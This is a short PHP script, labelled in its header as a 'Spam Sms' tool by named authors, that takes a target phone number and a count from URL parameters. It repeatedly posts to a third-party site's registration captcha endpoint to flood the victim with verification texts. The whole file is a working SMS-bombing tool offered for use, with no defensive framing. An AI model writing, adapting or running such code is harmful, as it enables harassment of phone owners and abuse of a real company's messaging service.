<?php

/* 
Cube Tv Spam Sms
C0ded by : Muhammad Ikhsan f.t Achmad Rivaldi
Github  : https://github.com/thaniaanatasya
Admin Nabila Tools, format : cube.php?no=7482967266&area=44&sms=10
no=8771407xXx nomor HP target
area=62 untuk indonesia
sms=10 jumlah sms lu
*/
if(!$_GET['no']){ 
echo "Nabila Tools SMS Cube Tv";
}else{
$sms = $_GET['loop'];
$no = $_GET['no'];
$area = $_GET['area'];
            $header = array(
		    'POST /register/captcha HTTP/1.1',
		    'Host: www.cubetv.sg',
		    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0',
		    'Accept: application/json, text/plain, */*',
		    'Accept-Language: en-US,en;q=0.5',
		    'Accept-Encoding: gzip, deflate',
		    'Content-Type: application/x-www-form-urlencoded',
		    'Referer: http://www.cubetv.sg/api/',
		    'Content-Length: 26',
		    'Cookie: cube_uuid=25ffd11c231f430a9b82b30ef2df0a16; _ga=GA1.2.1824394386.1528805257; _gid=GA1.2.761711045.1528805257',
		    'Connection: keep-alive',);
    function http($postdata){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'http://www.cubetv.sg/register/captcha');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_VERBOSE, false);
        if(!empty($postdata)){
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
        }
        $response = curl_exec($ch);
        $http = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        return array($http, $response);
    }
    for ($x = 3;$x <= $sms ;$x++) {
    http("acode=".$area."&phone=".$no.""); 
    echo "Sms ke ".$no." Sukses<br>";
}
}

?>